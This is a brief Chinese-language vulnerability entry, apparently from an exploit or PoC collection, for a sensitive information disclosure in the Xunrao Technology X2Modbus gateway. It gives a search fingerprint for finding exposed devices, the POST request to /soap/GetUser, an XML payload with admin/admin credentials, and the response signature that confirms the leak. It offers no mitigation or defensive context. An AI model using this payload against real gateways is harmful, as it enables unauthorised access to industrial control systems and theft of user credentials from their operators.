# 迅饶科技X2Modbus网关GetUser敏感信息泄露

迅饶科技X2Modbus网关GetUser敏感 ｜ 信息泄露 ｜ —
- **指纹**：`server="SunFull-Webs"`
- **请求**：`POST /soap/GetUser HTTP/1.1`

**Payload**
```
<GetUser><User Name="admin" Password="admin"/></GetUser>
```
- **响应特征**：200 UserName